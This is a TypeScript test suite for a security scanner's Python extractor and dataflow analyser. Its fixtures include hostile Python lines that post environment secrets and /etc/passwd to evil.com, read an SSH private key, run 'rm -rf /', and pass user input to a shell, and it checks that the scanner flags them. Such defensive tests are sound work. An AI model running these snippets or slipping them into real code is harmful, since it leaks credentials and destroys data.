import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { pyExtractor } from '../core/analysers/behavioural/py-extractor.js';
import { analyseDataflows } from '../core/analysers/behavioural/dataflow.js';
import { BehaviouralAnalyser } from '../core/analysers/behavioural/index.js';
import { defaultPolicy } from '../core/scan-policy.js';
import type { FileInfo } from '../scanner/file-walker.js';

// ── Helpers ──────────────────────────────────────────────────────────────

function makeFile(relativePath: string, content: string): FileInfo {
  const ext = '.' + relativePath.split('.').pop()!;
  return {
    path: `/scan-root/${relativePath}`,
    relativePath,
    content,
    extension: ext,
  };
}

// ── Python Extractor Tests ──────────────────────────────────────────────

describe('Python Extractor', () => {
  describe('imports', () => {
    it('should extract import statements', () => {
      const result = pyExtractor.extract('import subprocess', 'test.py');
      assert.ok(result);
      assert.equal(result.imports.length, 1);
      assert.equal(result.imports[0].source, 'subprocess');
    });

    it('should extract from...import statements', () => {
      const result = pyExtractor.extract(
        'from os import system, getenv',
        'test.py',
      );
      assert.ok(result);
      assert.equal(result.imports.length, 1);
      assert.equal(result.imports[0].source, 'os');
      assert.deepEqual(result.imports[0].imported, ['system', 'getenv']);
    });

    it('should extract from...import * statements', () => {
      const result = pyExtractor.extract(
        'from subprocess import *',
        'test.py',
      );
      assert.ok(result);
      assert.deepEqual(result.imports[0].imported, ['*']);
    });

    it('should extract aliased imports', () => {
      const result = pyExtractor.extract(
        'from os import getenv as env',
        'test.py',
      );
      assert.ok(result);
      assert.deepEqual(result.imports[0].imported, ['getenv']);
    });
  });

  describe('sources', () => {
    it('should detect os.environ access', () => {
      const result = pyExtractor.extract(
        'secret = os.environ["API_KEY"]',
        'test.py',
      );
      assert.ok(result);
      assert.ok(result.sources.length > 0);
      assert.equal(result.sources[0].kind, 'env');
    });

    it('should detect os.getenv()', () => {
      const result = pyExtractor.extract(
        'key = os.getenv("SECRET")',
        'test.py',
      );
      assert.ok(result);
      assert.ok(result.sources.some(s => s.kind === 'env'));
    });

    it('should detect file reads', () => {
      const result = pyExtractor.extract(
        'data = open("/etc/passwd").read()',
        'test.py',
      );
      assert.ok(result);
      assert.ok(result.sources.some(s => s.kind === 'fs_read'));
    });

    it('should detect credential file reads', () => {
      const result = pyExtractor.extract(
        'key = open("/home/user/.ssh/id_rsa").read()',
        'test.py',
      );
      assert.ok(result);
      assert.ok(result.sources.some(s => s.kind === 'credential_file'));
    });

    it('should detect user input via input()', () => {
      const result = pyExtractor.extract(
        'name = input("Enter name: ")',
        'test.py',
      );
      assert.ok(result);
      assert.ok(result.sources.some(s => s.kind === 'user_input'));
    });
  });

  describe('sinks', () => {
    it('should detect subprocess.run()', () => {
      const result = pyExtractor.extract(
        'subprocess.run(["ls", "-la"])',
        'test.py',
      );
      assert.ok(result);
      assert.ok(result.sinks.some(s => s.kind === 'exec'));
    });

    it('should detect os.system()', () => {
      const result = pyExtractor.extract(
        'os.system("rm -rf /")',
        'test.py',
      );
      assert.ok(result);
      assert.ok(result.sinks.some(s => s.kind === 'exec'));
    });

    it('should detect eval()', () => {
      const result = pyExtractor.extract(
        'eval(user_input)',
        'test.py',
      );
      assert.ok(result);
      assert.ok(result.sinks.some(s => s.kind === 'eval'));
    });

    it('should detect exec()', () => {
      const result = pyExtractor.extract(
        'exec(code_string)',
        'test.py',
      );
      assert.ok(result);
      assert.ok(result.sinks.some(s => s.kind === 'eval'));
    });

    it('should detect requests.post()', () => {
      const result = pyExtractor.extract(
        'requests.post("https://evil.com", data=secret)',
        'test.py',
      );
      assert.ok(result);
      assert.ok(result.sinks.some(s => s.kind === 'network_send'));
    });

    it('should detect file writes', () => {
      const result = pyExtractor.extract(
        'open("/tmp/out", "w").write(data)',
        'test.py',
      );
      assert.ok(result);
      assert.ok(result.sinks.some(s => s.kind === 'file_write'));
    });
  });

  describe('functions', () => {
    it('should extract function definitions', () => {
      const result = pyExtractor.extract(
        'def process_data(input_data, output_path):\n    pass',
        'test.py',
      );
      assert.ok(result);
      assert.equal(result.functions.length, 1);
      assert.equal(result.functions[0].name, 'process_data');
      assert.deepEqual(result.functions[0].params, ['input_data', 'output_path']);
    });

    it('should extract async function definitions', () => {
      const result = pyExtractor.extract(
        'async def fetch_data(url):\n    pass',
        'test.py',
      );
      assert.ok(result);
      assert.equal(result.functions[0].name, 'fetch_data');
    });

    it('should mark private functions as not exported', () => {
      const result = pyExtractor.extract(
        'def _internal_helper():\n    pass',
        'test.py',
      );
      assert.ok(result);
      assert.equal(result.functions[0].exported, false);
    });
  });

  describe('suspicious strings', () => {
    it('should detect external URLs', () => {
      const result = pyExtractor.extract(
        'url = "https://evil.example.com/exfil"',
        'test.py',
      );
      assert.ok(result);
      assert.ok(result.suspiciousStrings.length > 0);
    });

    it('should not flag localhost URLs', () => {
      const result = pyExtractor.extract(
        'url = "http://localhost:8080/api"',
        'test.py',
      );
      assert.ok(result);
      assert.equal(result.suspiciousStrings.length, 0);
    });
  });
});

// ── Dataflow Tests (Python) ─────────────────────────────────────────────

describe('Python Dataflow', () => {
  it('should detect env → network exfiltration', () => {
    const code = [
      'import os',
      'import requests',
      '',
      'secret = os.environ["API_KEY"]',
      'requests.post("https://evil.com", data=secret)',
    ].join('\n');

    const extraction = pyExtractor.extract(code, 'exfil.py')!;
    const flows = analyseDataflows(extraction, code, 'python');

    assert.ok(flows.length > 0, 'Should detect at least one flow');
    const exfil = flows.find(f =>
      f.source.kind === 'env' && (f.sink.kind === 'network_send' || f.sink.kind === 'fetch'),
    );
    assert.ok(exfil, 'Should detect env → network flow');
  });

  it('should detect input → exec command injection', () => {
    const code = [
      'import subprocess',
      '',
      'cmd = input("Enter command: ")',
      'subprocess.run(cmd, shell=True)',
    ].join('\n');

    const extraction = pyExtractor.extract(code, 'inject.py')!;
    const flows = analyseDataflows(extraction, code, 'python');

    assert.ok(flows.length > 0, 'Should detect at least one flow');
    const inject = flows.find(f =>
      f.source.kind === 'user_input' && f.sink.kind === 'exec',
    );
    assert.ok(inject, 'Should detect input → exec flow');
  });

  it('should detect file read → network send', () => {
    const code = [
      'import requests',
      '',
      'data = open("/etc/passwd").read()',
      'requests.post("https://evil.com", data=data)',
    ].join('\n');

    const extraction = pyExtractor.extract(code, 'read-send.py')!;
    const flows = analyseDataflows(extraction, code, 'python');

    assert.ok(flows.length > 0, 'Should detect file read → network flow');
  });

  it('should propagate taint through assignments', () => {
    const code = [
      'import os',
      'import requests',
      '',
      'secret = os.environ["KEY"]',
      'payload = secret',
      'requests.post("https://evil.com", data=payload)',
    ].join('\n');

    const extraction = pyExtractor.extract(code, 'propagate.py')!;
    const flows = analyseDataflows(extraction, code, 'python');

    assert.ok(flows.length > 0, 'Should detect flow through assignment chain');
  });
});

// ── BehaviouralAnalyser integration (Python) ─────────────────────────────

describe('BehaviouralAnalyser (Python)', () => {
  it('should analyze Python files and produce findings', async () => {
    const code = [
      'import os',
      'import requests',
      '',
      'secret = os.environ["API_KEY"]',
      'requests.post("https://evil.com/exfil", data=secret)',
    ].join('\n');

    const analyser = new BehaviouralAnalyser();
    const policy = defaultPolicy();
    const findings = await analyser.analyse({
      rootDir: '.',
      files: [makeFile('malicious.py', code)],
      policy,
    });

    assert.ok(findings.length > 0, 'Should produce findings for malicious Python');
    const exfil = findings.find(f => f.rule_id === 'DATAFLOW_EXFIL');
    assert.ok(exfil, 'Should detect DATAFLOW_EXFIL in Python');
  });

  it('should analyze mixed JS + Python files together', async () => {
    const jsCode = 'const secret = process.env.API_KEY;\nfetch("https://evil.com", { body: secret });';
    const pyCode = 'import os\nimport requests\nsecret = os.environ["KEY"]\nrequests.post("https://evil.com", data=secret)';

    const analyser = new BehaviouralAnalyser();
    const policy = defaultPolicy();
    const findings = await analyser.analyse({
      rootDir: '.',
      files: [
        makeFile('app.ts', jsCode),
        makeFile('script.py', pyCode),
      ],
      policy,
    });

    assert.ok(findings.length >= 2, 'Should produce findings from both JS and Python');
  });

  it('should skip clean Python files', async () => {
    const code = [
      'import json',
      '',
      'def hello(name):',
      '    print(f"Hello, {name}!")',
      '',
      'hello("world")',
    ].join('\n');

    const analyser = new BehaviouralAnalyser();
    const policy = defaultPolicy();
    const findings = await analyser.analyse({
      rootDir: '.',
      files: [makeFile('clean.py', code)],
      policy,
    });

    assert.equal(findings.length, 0, 'Should produce no findings for clean Python');
  });
});
